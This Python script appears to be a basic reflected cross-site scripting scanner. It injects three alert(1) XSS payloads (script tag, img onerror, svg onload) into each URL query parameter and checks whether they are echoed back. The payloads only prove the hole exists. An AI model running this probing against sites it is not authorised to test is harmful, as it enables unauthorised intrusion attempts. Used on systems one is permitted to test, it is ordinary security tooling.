import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "'><svg/onload=alert(1)>"
]

def test_xss(url):
    print(f"\n[+] Testing for XSS on: {url}")

    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)

    if not query_params:
        print("[-] No query parameters to test for XSS.")
        return

    for param in query_params:
        for payload in XSS_PAYLOADS:
            
            test_params = query_params.copy()
            test_params[param] = payload

            
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))

            try:
                response = requests.get(test_url)
                if payload in response.text:
                    print(f"[!] Potential XSS in '{param}' using payload: {payload}")
                else:
                    print(f"[-] Payload not reflected in param '{param}'")
            except Exception as e:
                print(f"[!] Error testing param '{param}': {e}")